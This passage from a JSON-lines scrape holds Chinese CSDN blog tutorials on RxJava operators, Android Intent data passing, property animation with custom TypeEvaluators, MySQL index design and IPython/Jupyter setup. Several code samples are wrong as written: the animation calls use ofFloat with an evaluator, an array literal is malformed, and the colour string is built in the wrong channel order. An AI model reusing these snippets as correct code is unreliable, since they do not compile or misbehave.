integer);\n            }\n        });\n\n\n\ncompose  \n与 flatMap 类似，都是进行变换，返回Observable对象，激活并发送事件。 \n1.compose 是唯一一个能够从数据流中得到原始Observable的操作符，所以，那些需要对整个数据流产生作用的操作（比如，subscribeOn()和observeOn()）需要使用 compose 来实现。相较而言，如果在flatMap()中使用subscribeOn()或者observeOn()，那么它仅仅对在flatMap 中创建的Observable起作用，而不会对剩下的流产生影响。这样就可以简化subscribeOn()以及observeOn()的调用次数了。 \n2.compose 是对 Observable 整体的变换，换句话说， flatMap 转换Observable里的每一个事件，而 compose 转换的是整个Observable数据流。 \n3.flatMap 每发送一个事件都创建一个 Observable，所以效率较低。而 compose 操作符只在主干数据流上执行操作。 \n4.建议使用 compose 代替 flatMap。\n\nFirst \n只发送符合条件的第一个事件。可以与contact操作符，做网络缓存。 \n例子：依次检查Disk与Network，如果Disk存在缓存，则不做网络请求，否则进行网络请求。\n\n\n\n// 从缓存获取\n        Observable<BookList> fromDisk = Observable.create(new Observable.OnSubscribe<BookList>() {\n            @Override\n            public void call(Subscriber<? super BookList> subscriber) {\n                BookList list = getFromDisk();\n                if (list != null) {\n                    subscriber.onNext(list);\n                } else {\n                    subscriber.onCompleted();\n                }\n            }\n        });\n\n// 从网络获取\n        Observable<BookList> fromNetWork = bookApi.getBookDetailDisscussionList();\n\n        Observable.concat(fromDisk, fromNetWork)\n                // 如果缓存不为null，则不再进行网络请求。反之\n                .first()\n                .subscribeOn(Schedulers.io())\n                .observeOn(AndroidSchedulers.mainThread())\n                .subscribe(new Subscriber<BookList>() {\n                    @Override\n                    public void onCompleted() {\n\n                    }\n\n                    @Override\n                    public void onError(Throwable e) {\n\n                    }\n\n                    @Override\n                    public void onNext(BookList discussionList) {\n\n                    }\n                });\n\n\nSingle  \nSingle与Observable类似，相当于是他的精简版。订阅者回调的不是OnNext/OnError/onCompleted，而是回调OnSuccess/OnError。\n\n\n\nSingle.create(new SingleOnSubscribe<Object>() {\n    @Override\n    public void subscribe(SingleEmitter<Object> e) throws Exception {\n        e.onSuccess(\"hello world\");\n    }\n}).subscribe(new SingleObserver<Object>() {\n    @Override\n    public void onSubscribe(Disposable d) {\n\n    }\n\n    @Override\n    public void onSuccess(Object value) {\n        Log.i(TAG, value.toString());\n    }\n\n    @Override\n    public void onError(Throwable e) {\n\n    }\n});\n\n\n\n可以配合debounce，避免SearchEditText频繁请求。\n\n\n\nfinal Subject subject = PublishSubject.create();\n\nsubject.debounce(400, TimeUnit.MILLISECONDS)\n        .subscribe(new Observer() {\n\n\n            @Override\n            public void onError(Throwable e) {\n\n            }\n\n            @Override\n            public void onComplete() {\n\n            }\n\n            @Override\n            public void onSubscribe(Disposable d) {\n\n            }\n\n            @Override\n            public void onNext(Object o) {\n                // request\n            }\n        });\n\nedittext.addTextChangedListener(new TextWatcher() {\n\n    @Override\n    public void beforeTextChanged(CharSequence s, int start, int count, int after) { }\n\n    @Override\n    public void onTextChanged(CharSequence s, int start, int before, int count) {\n        subject.onNext(s.toString());\n    }\n\n    @Override\n    public void afterTextChanged(Editable s) { }\n});\n\n\n\nRxJava的一些使用场景\n\n场景1： \n取数据，首先检查内存是否有缓存  \n然后检查文件缓存中是否有  \n最后才从网络中取  \n前面任何一个条件满足，就不会执行后面的\n\nfinal Observable<String> memory = Observable.create(new ObservableOnSubscribe<String>() {\n    @Override\n    public void subscribe(ObservableEmitter<String> emitter) throws Exception {\n        if (memoryCache != null) {\n            emitter.onNext(memoryCache);\n        } else {\n            emitter.onComplete();\n        }\n    }\n});\n\nfinal Observable<String> disk  = Observable.create(new ObservableOnSubscribe<String>() {\n    String cachePref = getSharedPreferences(\"rxdeni\",MODE_PRIVATE).getString(\"cache\",null);\n    @Override\n    public void subscribe(ObservableEmitter<String> emitter) throws Exception {\n        if (cachePref != null) {\n            emitter.onNext(cachePref);\n        } else {\n            emitter.onComplete();\n        }\n    }\n});\n\nObservable<String> network = Observable.just(\"network\");\n\n//主要就是靠concat operator来实现\nObservable.concat(memory, disk, network).firstElement()\n\n        .subscribeOn(Schedulers.newThread())\n        .subscribe(new Consumer<String>() {\n            @Override\n            public void accept(String s) throws Exception {\n                System.out.println(\"--------------subscribe: \" + s);\n            }\n        });\n\n场景2：界面需要等到多个接口并发取完数据，再更新\n\n\n\nObservable<String> observable1 = Observable.create(new ObservableOnSubscribe<String>() {\n        @Override\n        public void subscribe(ObservableEmitter<String> e) throws Exception {\n            e.onNext(\"haha\");\n        }\n    }).subscribeOn(Schedulers.newThread());\n\n    Observable<String> observable2 = Observable.create(new ObservableOnSubscribe<String>() {\n        @Override\n        public void subscribe(ObservableEmitter<String> e) throws Exception {\n            e.onNext(\"hehe\");\n        }\n    }).subscribeOn(Schedulers.newThread());\n\n\n    Observable.merge(observable1, observable2)\n            .subscribeOn(Schedulers.newThread())\n            .subscribe(new Observer<String>() {\n                @Override\n                public void onSubscribe(Disposable d) {\n\n                }\n\n                @Override\n                public void onNext(String value) {\n                    Log.d(TAG,value);\n                }\n\n                @Override\n                public void onError(Throwable e) {\n\n                }\n\n                @Override\n                public void onComplete() {\n\n                }\n            });\n\n场景3：界面按钮需要防止连续点击的情况\n\n\n\nRxView.clicks(button)\n        .throttleFirst(1, TimeUnit.SECONDS)\n        .subscribe(new Observer<Object>() {\n            @Override\n            public void onCompleted() {\n\n            }\n\n            @Override\n            public void onError(Throwable e) {\n\n            }\n\n            @Override\n            public void onNext(Object o) {\n                Log.i(TAG, \"do clicked!\");\n            }\n        });\n\n场景4：响应式的界面 \n比如勾选了某个checkbox，自动更新对应的preference\n\n\n\nSharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);\nRxSharedPreferences rxPreferences = RxSharedPreferences.create(preferences);\n\nPreference<Boolean> checked = rxPreferences.getBoolean(\"checked\", true);\n\nCheckBox checkBox = (CheckBox) findViewById(R.id.cb_test);\nRxCompoundButton.checkedChanges(checkBox)\n        .subscribe(checked.asAction());\n\n场景5：复杂的数据变换\n\n\n\nObservable.just(\"1\", \"2\", \"6\", \"3\", \"4\", \"5\")\n        .map(new Function<String, Integer>() {\n            @Override\n            public Integer apply(String s) throws Exception {\n                return Integer.parseInt(s);\n            }\n        }).filter(new Predicate<Integer>() {\n    @Override\n    public boolean test(Integer integer) throws Exception {\n        return integer.intValue()%2 == 0;\n    }\n}).distinct().take(2).reduce(new BiFunction<Integer, Integer, Integer>() {\n    @Override\n    public Integer apply(Integer integer, Integer integer2) throws Exception {\n        return integer.intValue() + integer2.intValue();\n    }\n}).subscribe(new Consumer<Integer>() {\n    @Override\n    public void accept(Integer integer) throws Exception {\n       Log.d(TAG,integer.toString());\n    }\n});", "time": "2018_08_14_11_13_02", "link": "https://blog.csdn.net/u012124438/article/details/53730717", "title": "一篇博客让你了解RxJava"}
{"timestamp": "2018_08_14_11_13_04", "desc": "1 Android之intent传值的三种方法\n\n（1） startActivity(); \n（2） startActivityForResult(); \n（3）3 调用在下个activity自定义的方法”actionStart()”,也就是最佳的方法。\n\n\n\n2 最常用传值跳转：startActivity()方法\n\n\n\n2.1 MainActivity\n\n\n\n// 在MainActivity中定义如下代码 \nbutton1.setOnClickListener(new OnClickListener() {\n    @Override\n    public void onClick(View v) {\n            Intent intent = new \n            Intent(MainActivity.this,TwoActivity.class);\n            //在Intent对象当中添加一个键值对\n            intent.putExtra(\"key\",\"value\");                 \n            startActivity(intent);\n    }\n});\n\n\n\n2.2 TwoActivity\n\n\n\n// 在TwoActivity中定义如下代码\npublic class TwoActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        button2.setOnClickListener(new OnClickListener() {\n\n            @Override\n            public void onClick(View v) {\n                //取得从上一个Activity当中传递过来的Intent对象\n                Intent intent = getIntent();\n                //从Intent当中根据key取得value\n                if (intent != null) {\n                    String value = intent.getStringExtra(\"key\");\n                }\n            }\n        });\n    }\n}\n\n\n\n3 回调数据式传值跳转：startActivityForResult()方法\n\n\n\n3.1 MainActivity\n\n\n\nbutton1.setOnClickListener(new OnClickListener() {\n    @Override\n    public void onClick(View v) {\n             Intent intent = new Intent(MainActivity.this,TwoActivity.class);\n             intent.putExtra(\"key\", \"value\");\n             // 第二个参数是请求码，只要是一个唯一值\n             startActivityForResult(intent, 1234);\n    }\n});\n\n // 由于我们是使用startActivityForResult()方法来启动TwoActivity的，在TwoActivity被销毁之后会回调上一个活动的onActivityResult()方法\n    @Override\n    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {\n        switch (requestCode) {\n            case 1234:\n                if (resultCode == RESULT_OK) {\n                    //接收对象\n                    //Bundle bundle = data.getExtras();\n                    //AddressBean addressBean = (AddressBean) bundle.getSerializable(Constant.ADDRESSBEAN);\n\n                    String returnedData = intent.getStringExtra(\"key1\");\n                }\n                break;\n\n            default:\n        }\n    }\n\n\n\n3.2 TwoActivity\n\n\n\npublic class TwoActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        //接收从MainaActivity传递的数据\n        Intent intent = getIntent();\n        if (intent != null) {\n            String value = intent.getStringExtra(\"key\");\n        }\n\n        button2.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                //传递对象\n                //Intent intent = new Intent();\n                //Bundle bundle = new Bundle();\n                //bundle.putSerializable(Constant.ADDRESSBEAN, addressArray.get(position));\n                //intent.putExtras(bundle);\n                //setResult(RESULT_OK, intent);\n                //finish();\n\n                Intent intent = new Intent();\n                intent.putExtra(\"key1\",\"value　two activity\");\n                // 专门用于向上一个活动返回数据。第一个参数用于向上一个活动返回结果码，一般只使用RESULT_OK或RESULT_CANCELED这两个值\n                setResult(RESULT_OK, intent)；\n                finish();\n            }\n        });\n    }\n}\n\n\n\n4 启动活动的最佳写法\n\n\n\n4.1 问题描述\n\n　　在真正的项目开发中经常会有对接的问题出现。如：TwoActivity并不是由你开发的，但现在你负责的部分需要有启动TwoActivity这个功能，而你却不清楚启动这个活动需要传递哪些数据。\n\n\n\n4.1 MainActivity\n\n\n\nbutton1.setOnClickListener(new OnClickListener() {\n    @Override\n    public void onClick(View v) {\n            /*最佳数据传值方法：调用在下个activity自定义的方法*/\n            TwoActivity.actionStart(MainActivity.this, \"data1\", \"data2\");\n    }\n});\n\n\n\n4.2 TwoActivity\n\n\n\npublic class TwoActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n    }\n    //最佳数据传值方法\n    public static void actionStart(Context context, String data1, String data2) {\n        Intent intent = new Intent(context, TwoActivity.class);\n        intent.putExtra(\"param1\", data1);\n        intent.putExtra(\"param2\", data2);\n        context.startActivity(intent);\n    }\n}\n\n\n\n4.3 结论\n\n　　实现后，所有TwoActivity中需要的数据都是通过actionStart()方法的参数传递过来的，然后把它们存储到Intent中，最后调用startActivity()方法启动TwoActivity。\n\n\n\n5 传递大量数据方案\n\n　　Activity 间的数据通信，对于数据量比较大的，避免使用Intent+Parcelable \n的方式，可以考虑EventBus等替代方案，以免造成 TransactionTooLargeException。\n\n6 Intent传递类对象\n\n\n\n6.1 两种方式\n\n　　Android中Intent传递类对象提供了两种方式，一种是：通过实现Serializable接口传递对象，一种是通过实现Parcelable接口传递对象。Intent中传递这2种对象的方法：\n\n\n\nBundle.putSerializable(Key,Object);  //实现Serializable接口的对象  \nBundle.putParcelable(Key, Object); //实现Parcelable接口的对象\n\n\n\n6.2 步骤\n\n（1） 创建一个序列化类：User\n\n\n\npublic class User implements Serializable {\n 　 private int ID;\n    private String UserName;    \n    private String PWD;    \n    public final void setID(int value){\n        ID = value;\n    }\n    public final int getID(){\n        return ID;\n    }    \n    public final void setUserName(String value){\n        UserName = value;\n    }\n    public final String getUserName(){\n        return UserName;\n    }  \n    public final void setPWD(String value){\n        PWD = value;\n    }\n    public final String getPWD(){\n        return PWD;\n    }    \n}\n\n（2） 发送对象(通过Bundle来封装数据)\n\n\n\nIntent intent = new Intent();\nintent.setClass(Login.this, MainActivity.class);\nBundle bundle = new Bundle();\nbundle.putSerializable(\"user\", user);\nintent.putExtras(bundle);\nthis.startActivity(intent);\n\n（3）接收对象\n\n\n\nIntent intent = this.getIntent(); \nuser=(User)intent.getSerializableExtra(\"user\");\n\n\n\n6.3 补充\n\n　　如果传递的是List,可以把list强转成Serializable类型,而且object类型也必须实现了Serializable接口\n\n\n\nIntent.putExtras(key, (Serializable)list) //发送\n(List<YourObject>)getIntent().getSerializable(key) //接收\n\n\n\n6.4 传递多个String或者多个集合\n\n\n\nBundle bundle = new Bundle();\n//将多个String封装成String[]\nString[] idTag = new String[{\"id\",\"tag\"};\nbundle.putStringArray(Config.KEY_IDTAG_ARRAY, idTag);//传递字符串数组\n\n//将对象集合封装在一个对象中，传递对象\nListBean listBean = new ListBean();\nlistBean.setParamList(paramList);\nlistBean.setAddCartList(addCartList);\nbundle.putSerializable(\"key\", listBean);//传递集合对象\nstartActivityForResult(AddCartActivity.class, cartBundle, 0);", "time": "2018_08_14_11_13_04", "link": "https://blog.csdn.net/chenliguan/article/details/47188243", "title": "Android基础之intent传值方法和传递大量数据方案"}
{"timestamp": "2018_08_14_11_13_04", "desc": "属性动画对补间动画进行了很大幅度的改进，之前补间动画可以做到的属性动画也能做到，补间动画做不到的现在属性动画也可以做到了。因此，今天我们就来学习一下属性动画的高级用法，看看如何实现一些补间动画所无法实现的功能。\n\n\n\nValueAnimator的高级用法\n\n补间动画是只能对View对象进行动画操作的。而属性动画就不再受这个限制，它可以对任意对象进行动画操作。那么大家应该还记得在上篇文章当中我举的一个例子，比如说我们有一个自定义的View，在这个View当中有一个Point对象用于管理坐标，然后在onDraw()方法当中就是根据这个Point对象的坐标值来进行绘制的。也就是说，如果我们可以对Point对象进行动画操作，那么整个自定义View的动画效果就有了。OK，下面我们就来学习一下如何实现这样的效果。\n\n那么TypeEvaluator的作用到底是什么呢？简单来说，就是告诉动画系统如何从初始值过度到结束值。我们在上一篇文章中学到的ValueAnimator.ofFloat()方法就是实现了初始值与结束值之间的平滑过度，那么这个平滑过度是怎么做到的呢？其实就是系统内置了一个FloatEvaluator，它通过计算告知动画系统如何从初始值过度到结束值，我们来看一下FloatEvaluator的代码实现：\n\npublic class FloatEvaluator implements TypeEvaluator {  \n    public Object evaluate(float fraction, Object startValue, Object endValue) {  \n        float startFloat = ((Number) startValue).floatValue();  \n        return startFloat + fraction * (((Number) endValue).floatValue() - startFloat);  \n    }  \n}\n\n\n可以看到，FloatEvaluator实现了TypeEvaluator接口，然后重写evaluate()方法。evaluate()方法当中传入了三个参数，第一个参数fraction非常重要，这个参数用于表示动画的完成度的，我们应该根据它来计算当前动画的值应该是多少，第二第三个参数分别表示动画的初始值和结束值。那么上述代码的逻辑就比较清晰了，用结束值减去初始值，算出它们之间的差值，然后乘以fraction这个系数，再加上初始值，那么就得到当前动画的值了。\n\n但是相比于浮点型或整型数据，对象的动画操作明显要更复杂一些，因为系统将完全无法知道如何从初始对象过度到结束对象，因此这个时候我们就需要实现一个自己的TypeEvaluator来告知系统如何进行过度。\n\npublic class  Point{\n    private float x;\n    private float y;\n\n    public Point(float x, float y){\n        this.x = x;\n        this.y = y;\n\n\n    }\n\n    public float getY() {\n        return y;\n    }\n\n    public float getX() {\n        return x;\n    }\n}\n\n\nPoint类非常简单，只有x和y两个变量用于记录坐标的位置，并提供了构造方法来设置坐标，以及get方法来获取坐标。接下来定义PointEvaluator，如下所示：\n\npublic class PointEvaluator implements TypeEvaluator{\n\n    @Override\n    public Object evaluate(float fraction, Object startValue, Object endValue) {\n        Point startPoint = (Point) startValue;\n        Point endPoint = (Point) endValue;\n        float x = startPoint.getX() + fraction*(endPoint.getX()-startPoint.getX());\n        float y = startPoint.getY() + fraction*(endPoint.getY()-startPoint.getY());\n        Point point = new Point(x,y);\n\n        return point;\n    }\n}\n\n\n可以看到，PointEvaluator同样实现了TypeEvaluator接口并重写了evaluate()方法。其实evaluate()方法中的逻辑还是非常简单的，先是将startValue和endValue强转成Point对象，然后同样根据fraction来计算当前动画的x和y的值，最后组装到一个新的Point对象当中并返回。 \n这样我们就将PointEvaluator编写完成了，接下来我们就可以非常轻松地对Point对象进行动画操作了，以这样写：\n\nPoint point1 = new Point(0,0);\nPoint point2 = new Point(300,300);\nValueAnimator animator = ValueAnimator.ofFloat(new PointEvaluator,point1,point2);\nanimator.setDuration(4000);\nanimator.start();\n\n\n好的，这就是自定义TypeEvaluator的全部用法，掌握了这些知识之后，我们就可以来尝试一下如何通过对Point对象进行动画操作，从而实现整个自定义View的动画效果。\n\n\n\npublic class MyView extends View{\n    public  static final float REDIUS = 50f;\n    private Point currentPoint;\n    private Paint mPaint;\n\n\n    public MyView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        mPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint.setColor(Color.BLUE);\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n        if (currentPoint==null){\n            currentPoint = new Point(REDIUS,REDIUS);\n            drawCircle(canvas);\n            startAnimation();\n        }else {\n            drawCircle(canvas);\n        }\n    }\n\n    private void startAnimation() {\n        Point startPoint = new Point(REDIUS,REDIUS);\n        Point endPoint = new Point(getWidth()-REDIUS,getHeight()-REDIUS);\n        ValueAnimator anim = ValueAnimator.ofFloat(new PointEvaluator,startPoint,endPoint);\n        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(ValueAnimator animation) {\n                currentPoint = (Point) animation.getAnimatedValue();\n                invalidate();\n            }\n        });\n        anim.setDuration(4000);\n        anim.start();\n    }\n\n    private void drawCircle(Canvas canvas) {\n        float x = currentPoint.getX();\n        float y = currentPoint.getY();\n        canvas.drawCircle(x,y,REDIUS,mPaint);\n\n    }\n\n\n}\n\n\n首先在自定义View的构造方法当中初始化了一个Paint对象作为画笔，并将画笔颜色设置为蓝色，接着在onDraw()方法当中进行绘制。这里我们绘制的逻辑是由currentPoint这个对象控制的，如果currentPoint对象不等于空，那么就调用drawCircle()方法在currentPoint的坐标位置画出一个半径为50的圆，如果currentPoint对象是空，那么就调用startAnimation()方法来启动动画。\n\n下面我们只需要在布局文件当中引入这个自定义控件：\n\n<com.example.demo.MyView\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"wrap_content\"\n     />\n\n\n最后运行一下程序，效果如下图所示： \n\n\n\n\nObjectAnimator的高级用法\n\nObjectAnimator内部的工作机制是通过寻找特定属性的get和set方法，然后通过方法不断地对值进行改变，从而实现动画效果的。因此我们就需要在MyAnimView中定义一个color属性，并提供它的get和set方法。这里我们可以将color属性设置为字符串类型，使用#RRGGBB这种格式来表示颜色值，代码如下所示：\n\npublic class MyAnimView extends View{\nprivate String color;\n\n\npublic String getColor() {\n    return color;\n}\n\npublic void setColor(String color) {\n    this.color = color;\n    mPaint.setColor(Color.parseColor(color));\n    invalidate();\n}\n}\n\n\n注意在setColor()方法当中，我们编写了一个非常简单的逻辑，就是将画笔的颜色设置成方法参数传入的颜色，然后调用了invalidate()方法。这段代码虽然只有三行，但是却执行了一个非常核心的功能，就是在改变了画笔颜色之后立即刷新视图，然后onDraw()方法就会调用。在onDraw()方法当中会根据当前画笔的颜色来进行绘制，这样颜色也就会动态进行改变了。\n\n那么接下来的问题就是怎样让setColor()方法得到调用了，毫无疑问，当然是要借助ObjectAnimator类，但是在使用ObjectAnimator之前我们还要完成一个非常重要的工作，就是编写一个用于告知系统如何进行颜色过度的TypeEvaluator。创建ColorEvaluator并实现TypeEvaluator接口，代码如下所示：\n\npublic class ColorEvaluator implements TypeEvaluator{\n\n        private int mCurrentRed = -1;\n        private int mCurrentGreen = -1;\n        private int mCurrentBlue = -1;\n\n        @Override\n        public Object evaluate(float fraction, Object startValue, Object endValue) {\n            String startColor = (String) startValue;\n            String endColor = (String) endValue;\n\n            int startRed = Integer.parseInt(startColor.substring(1,3),16);\n            int startGreen = Integer.parseInt(startColor.substring(3,5),16);\n            int startBlue = Integer.parseInt(startColor.substring(5,7),16);\n            int endRed = Integer.parseInt(endColor.substring(1,3),16);\n            int endGreen = Integer.parseInt(endColor.substring(3,5),16);\n            int endBlue = Integer.parseInt(endColor.substring(5,7),16);\n            //初始化颜色的值\n            if ( mCurrentRed == -1){\n                mCurrentRed = startRed;\n            }\n            if ( mCurrentGreen == -1){\n                mCurrentGreen = startGreen;\n            }\n\n            if ( mCurrentBlue == -1){\n                mCurrentBlue = startBlue;\n            }\n            //计算初始颜色和借宿颜色的差值\n            int redDiff = Math.abs(startRed - endRed);\n            int greenDiff = Math.abs(startGreen - endGreen);\n            int blueDiff = Math.abs(startBlue - endBlue);\n            int colorDiff = redDiff+greenDiff+blueDiff;\n\n            if (mCurrentGreen!=endGreen){\n                mCurrentGreen = getCurrentColor(startGreen,endGreen,colorDiff,redDiff,fraction);\n            }else if (mCurrentRed!=endRed){\n                mCurrentRed = getCurrentColor(startRed,endRed,colorDiff,0,fraction);\n            }else if (mCurrentBlue != endBlue){\n                mCurrentBlue = getCurrentColor(startBlue,endBlue,colorDiff,redDiff+greenDiff,fraction);\n            }\n            //将当前颜色的值组装返回\n            String currentColor = \"#\"+getHexString(mCurrentRed)+getHexString(mCurrentBlue)+getHexString(mCurrentGreen);\n            return currentColor;\n        }\n\n        private String getHexString(int value) {\n            String hexString = Integer.toHexString(value);\n            if (hexString.length() == 1){\n                hexString = \"0\"+hexString;\n            }\n            return hexString;\n\n        }\n        //根据fraction值计算当前颜色\n        public int getCurrentColor(int startColor, int endColor, int colorDiff, int offset, float fraction) {\n            int currentColor;\n            if (startColor>endColor){\n                currentColor = (int) (startColor - (fraction*colorDiff-offset));\n                if (currentColor<endColor){\n                    currentColor = endColor;\n                }\n            }else {\n                currentColor = (int) (startColor + (fraction*colorDiff-offset));\n                if (currentColor>endColor){\n                    currentColor = endColor;\n                }\n            }\n            return currentColor;\n        }\n    }\n\n\n\n这大概是我们整个动画操作当中最复杂的一个类了。没错，属性动画的高级用法中最有技术含量的也就是如何编写出一个合适的TypeEvaluator。好在刚才我们已经编写了一个PointEvaluator，对它的基本工作原理已经有了了解，那么这里我们主要学习一下ColorEvaluator的逻辑流程吧。 \n首先在evaluate()方法当中获取到颜色的初始值和结束值，并通过字符串截取的方式将颜色分为RGB三个部分，并将RGB的值转换成十进制数字，那么每个颜色的取值范围就是0-255。接下来计算一下初始颜色值到结束颜色值之间的差值，这个差值很重要，决定着颜色变化的快慢，如果初始颜色值和结束颜色值很相近，那么颜色变化就会比较缓慢，而如果颜色值相差很大，比如说从黑到白，那么就要经历255*3这个幅度的颜色过度，变化就会非常快。 \n那么控制颜色变化的速度是通过getCurrentColor()这个方法来实现的，这个方法会根据当前的fraction值来计算目前应该过度到什么颜色，并且这里会根据初始和结束的颜色差值来控制变化速度，最终将计算出的颜色进行返回。\n\n最后，由于我们计算出的颜色是十进制数字，这里还需要调用一下getHexString()方法把它们转换成十六进制字符串，再将RGB颜色拼装起来之后作为最终的结果返回。\n\n好了，ColorEvaluator写完之后我们就把最复杂的工作完成了，剩下的就是一些简单调用的问题了，比如说我们想要实现从蓝色到红色的动画过度，历时5秒，就可以这样写：\n\n\n\nObjectAnimator anim = ObjectAnimator.ofFloat(myAnimView,\"color\",new ColorEvaluator(),\"#0000ff\",\"#ff0000\");\nanim.setDuration(5000);\nanim.start();\n\n\n用法非常简单易懂，相信不需要我再进行解释了。 \n接下来我们需要将上面一段代码移到MyAnimView类当中，让它和刚才的Point移动动画可以结合到一起播放，这就要借助我们在上篇文章当中学到的组合动画的技术了。修改MyAnimView中的代码，如下所示：\n\npublic class MyAnimView extends View{\n    public  static final float REDIUS = 50f;\n    private Point currentPoint;\n    private Paint mPaint;\n\n\n    public MyAnimView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        mPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint.setColor(Color.BLUE);\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n        if (currentPoint==null){\n            currentPoint = new Point(REDIUS,REDIUS);\n            drawCircle(canvas);\n            startAnimation();\n        }else {\n            drawCircle(canvas);\n        }\n    }\n\n    private void startAnimation() {\n        Point startPoint = new Point(REDIUS,REDIUS);\n        Point endPoint = new Point(getWidth()-REDIUS,getHeight()-REDIUS);\n        ValueAnimator anim = ValueAnimator.ofFloat(new PointEvaluator,startPoint,endPoint);\n        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(ValueAnimator animation) {\n                currentPoint = (Point) animation.getAnimatedValue();\n                invalidate();\n            }\n        });\n        ObjectAnimator anim2 = ObjectAnimator.ofFloat(myAnimView,\"color\",new ColorEvaluator(),\"#0000ff\",\"#ff0000\");\n        AnimatorSet animSet = new AnimatorSet();\n        animSet.play(anim).with(anim2);\n        anim.setDuration(5000);\n        anim.start();\n\n    }\n\n\n可以看到，我们并没有改动太多的代码，重点只是修改了startAnimation()方法中的部分内容。这里先是将颜色过度的代码逻辑移动到了startAnimation()方法当中，注意由于这段代码本身就是在MyAnimView当中执行的，因此ObjectAnimator.ofObject()的第一个参数直接传this就可以了。接着我们又创建了一个AnimatorSet，并把两个动画设置成同时播放，动画时长为五秒，最后启动动画。现在重新运行一下代码，效果如下图所示：", "time": "2018_08_14_11_13_04", "link": "https://blog.csdn.net/u012124438/article/details/53365523", "title": "从零开始学Android自定义View之动画系列——属性动画（3）"}
{"timestamp": "2018_08_14_11_13_05", "desc": "索引的设计可以遵循一些已有的原则，创建索引的时候请尽量符合这些原则，便于提升索引地使用效率，更高效地使用索引。 \n1） 搜索的索引列，不一定是要选择的列。最适合索引的列是出现在where子句中的列，或连接子句中指定的列，而不是出现在select关键字后选择列表中的列。 \n2） 使用唯一索引。索引的列的基数越大，效果越好（建立索引列的数据要一定程度上不同）。例如，存放出生日期的列具有不同值，很容易区分各行。而用来记录性别的列，只有”M”和”F”，则对此列进行索引没有多大用处。 \n3） 使用短索引。如果对字符串建立索引，应该指定一个前缀长度，只要有可能就应该这样做。例如，有一个CHAR(200)的列，如果在前10或20个字符内，多数值是唯一的，那么就不要对整个列进行索引。对前10或20个字符建立索引能够节省大量索引空间，也可能会使查询更快。较小的索引涉及的磁盘IO较少，较短的值比较起来更快。对于较短的键值，索引高速缓存中的块能容纳更多的键值，MySQL也可以在内存中容纳更多的值。这样就增加了找到行而不用读取索引中较多块的可能性。 \n4） 利用最左前缀。在创建一个n列的索引时，实际是创建了n个索引。多列索引可起到几个索引的作用，因为可利用索引中最左边的列集来匹配行。这样的列集称为最左前缀。 \n5） 不要过度使用索引。每个额外的索引都要占用额外的磁盘空间，并降低写操作的性能。在修改表的内容时，索引必须进行更新，有时可能需要重构，因此，索引越多，所化的时间越长。 \n6） 对于InnoDB存储引擎的表，记录默认会按照一定的顺序保存，如果有明确定义的主键，则按照主键顺序保存。如果没有主键，但是有唯一索引，那么就按照唯一索引的顺序保存。既没有主键又没有唯一索引，表中会自动生成一个内部列，按照这个列的顺序保存。按照主键或内部列进行访问是最快的，所以InnoDB表尽量自己指定主键，当表中同时有几个列都是唯一的，都可以作为主键的时候，要选择最常作为访问条件的列作为主键。InnoDB表的普通索引会保存主键的键值，所以主键要尽可能选择较短的数据类型，可以有效地减少索引的磁盘占用，提高索引的缓存效果。", "time": "2018_08_14_11_13_05", "link": "https://blog.csdn.net/zuimei_forver/article/details/68941201", "title": "索引设计的原则"}
{"timestamp": "2018_08_14_11_13_05", "desc": "IPython与IPython Notebook安装及使用\n\n\n\n\n\n1.安装IPython和IPython Notebook,相关包\n\n在python环境变量路径下的命令行中分别输入pip指令安装：\n\n\n\npip install IPython\npip install urllib3 （安装IPython Notebook的依赖）\npip install jupyter （安装IPython Notebook）\npip install numpy\npip install matplotlib\npip install pandas\npip install scipy\npip install scikit-learn\n\n \n\n\n\n\n2.IPython的使用\n\n在安装路径下运行ipython.exe \n\n\n基本的输出操作 \n\n\nTab提示函数自动补全 \n\n\n通过在模块或者函数名后面加?或者??就可以查看这个对象的信息 \n\n\n魔术指令: \n以%开头的叫做line magic，这种类型的指令只能作用与一行代码。 \n以%%开头的叫做cell magic，这种类型的指令可以作用于一个代码块。 \n示例： \n \n(注意：输入%%time后即进入多行操作，要用shift+enter多行输出） \n(1)%time,%timeit \nIPython提供两个魔术函数来计算代码执行时间 \n%time一次执行一条语句，然后报告总体执行时间 \n示例： \n \n为了得到更为精确的结果，需要使用魔术函数%timeit。 \n对于任意语句，它会自动多次执行以产生一个非常精确的平均执行时间。 \n示例： \n \n(2)%run  \n输入%run <外部脚本路径> 可以运行一个外部的python script, \n并把运行结果导入到当前的IPython上下文环境，好比说外部脚本定义了一个变量x， \n那么通过%run运行这个脚本之后就可以在IPython中继续使用这个变量。 \n(3)%edit \n如果需要编写一大段代码不适合使用IPython，那么就可以使用%edit指令， \n%edit指令能启动文本编辑器，在文本编辑器中编辑一段代码， \n保存退出后就可以在IPython中执行。 \n(4)%magic：查看帮助 \n输入exit即可退出IPython \n\n\n\n\n3.IPython Notebook的使用\n\n输入ipython notebook即可运行jupyter(原来的notebook) \n \n会直接在浏览器中打开 \n \n新建文件： \n \n上传文件： \n(1)直接在home页upload所选文件 \n打开后并不是IPython的编辑模式 \n \n(2)使用IPython的命令上传文件到kernel\n\n\n\n%load test.py（文件名）\n\n \nIPython notebook的使用时快捷键： \nCtrl+m h (就是先按住Ctrl+m，然后放开，单按一下h)显示所有的快捷键了 \nShift+Enter 会运行cell里面的代码，同时开辟一个新的cell \nCtrl+enter 则不会开辟新的cell，只是运行代码 \nCtrl+m d d 则是删除cell的 \nCtrl+m a 则是在当前cell的上方开辟新的cell \nCtrl+m b 